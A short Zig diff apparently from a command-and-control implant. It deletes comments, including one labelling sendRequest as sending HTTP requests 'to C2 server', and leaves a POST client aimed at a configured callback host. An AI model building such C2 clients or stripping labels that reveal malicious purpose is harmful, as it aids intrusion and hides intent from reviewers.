@@ -23,14 +23,12 @@ pub const NetworkClient = struct {
         self.client.deinit();
     }
     
-    // Send HTTP request to C2 server
     pub fn sendRequest(self: *NetworkClient, endpoint: []const u8, data: []const u8) ![]const u8 {
         const uri_str = try std.fmt.allocPrint(self.allocator, "http://{s}:{d}/{s}", .{ self.config.callback_host, self.config.callback_port, endpoint });
         defer self.allocator.free(uri_str);
         
         const uri = std.Uri.parse(uri_str) catch return error.InvalidUri;
         
-        // Create header buffer
         var header_buffer: [1024]u8 = undefined;
         var req = self.client.open(.POST, uri, .{
             .server_header_buffer = &header_buffer,
